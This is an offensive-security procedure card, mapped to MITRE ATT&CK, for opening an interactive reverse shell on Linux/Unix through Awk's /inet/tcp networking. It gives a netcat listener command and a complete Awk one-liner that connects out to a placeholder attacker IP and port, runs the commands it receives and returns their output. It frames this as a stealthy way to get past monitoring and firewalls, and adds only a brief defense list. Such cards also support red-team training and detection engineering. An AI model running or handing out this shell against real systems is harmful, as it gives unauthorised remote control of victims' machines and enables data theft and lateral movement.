---
id: 4740b7e3-e67c-4fec-bea2-684a9bb6a3c4
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.509302+00:00'
updated_at: '2023-04-10T20:25:25.230521+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Non-Standard Port|T1571 - Non-Standard Port]]'
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques: []
tags:
  - '[[tags/Awk]]'
  - '[[tags/Reverse Shell]]'
  - '[[tags/Reverse Shell Cheat Sheet]]'
commands:
  - '[[procedures/Awk-Interactive-Reverse-Shell]]'
platforms:
  - Linux
  - Unix
tools: []
validated: true
---

# Awk-Interactive-Reverse-Shell

## Summary

This procedure uses the Awk utility to create an interactive reverse shell on Unix-like systems, allowing an attacker with command execution access to establish a command-and-control (C2) channel back to their listening host. Awk's built-in networking features enable TCP connections without additional tools, making it a stealthy option for post-exploitation.

## Description

Awk is a standard text-processing tool available on most Unix-like operating systems, but it can be abused for network interactions via its special /inet/tcp/ file descriptor. This procedure leverages Awk to open a TCP socket to the attacker's IP and port, then enters a loop that sends a "shell>" prompt, reads incoming commands, pipes them to the shell for execution, captures and returns the output, and continues until the "exit" command is received. This provides full interactive shell access, enabling file manipulation, data exfiltration, or further persistence. The technique is useful in environments where common shell tools like Bash or Netcat are restricted or monitored, as Awk executions may blend with legitimate administrative tasks. It maps to MITRE ATT&CK for establishing C2 over non-standard ports using remote access tools.

## Requirements

1. Command execution capability on the target system (e.g., via initial RCE or compromised user shell).
2. Network connectivity from the target to the attacker's IP address and port (outbound TCP allowed).
3. Awk installed on the target (GNU Awk recommended for full networking support; standard on Linux/Unix distributions).
4. A listener set up on the attacker's machine (e.g., using Netcat on a non-standard port to evade basic firewalls).

## Defense

- Monitor process execution logs for Awk invocations with network-related arguments or /inet/tcp/ usage (e.g., via Sysmon or auditd).
- Implement network segmentation and egress filtering to block unauthorized outbound connections to non-standard ports.
- Enable application whitelisting to restrict execution of interpreters like Awk in sensitive environments.
- Use behavioral analytics to detect anomalous shell commands or unexpected TCP connections from system utilities.

## Objectives

1. Establish a persistent interactive shell session for remote command execution.
2. Bypass restrictions on common reverse shell tools by using a ubiquitous utility like Awk.
3. Facilitate command-and-control operations, such as reconnaissance or lateral movement on the target.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Before executing the reverse shell on the target, start a TCP listener on your control machine to receive the incoming connection. This step ensures the target can connect and interact.

Use a tool like Netcat to listen on the specified port (e.g., a non-standard port like 4242 to reduce detection risk).

```bash
nc -lvnp $_ATTACKER_PORT
```

> This command binds to the port and waits for connections. Why: Without a listener, the target's connection attempt will fail. Expected: Output showing "Listening on [port]" with no errors.

### Step 2: Execute Awk Reverse Shell on Target

**Context**: On the compromised target, run the Awk command to initiate the reverse connection. This step creates the TCP socket, handles command I/O, and provides the interactive shell.

**Command** ([[procedures/Awk-Interactive-Reverse-Shell]]):

```bash
awk 'BEGIN {s = "/inet/tcp/0/$_ATTACKER_IP/$_ATTACKER_PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

> This Awk script opens a TCP connection to the attacker, loops indefinitely to prompt for input, executes received commands via pipe to shell, and relays output. The /dev/null input prevents hanging. Why: It abuses Awk's networking for a full-featured shell without spawning obvious processes. Replace $_ATTACKER_IP and $_ATTACKER_PORT with actual values (e.g., your IP and listening port). If the connection succeeds, the target command runs silently; on your listener, you'll see the connection and can send commands like "id" or "ls /". Type "exit" to terminate. Decision point: If gawk is not available, test with a simple echo command first to verify networking support.
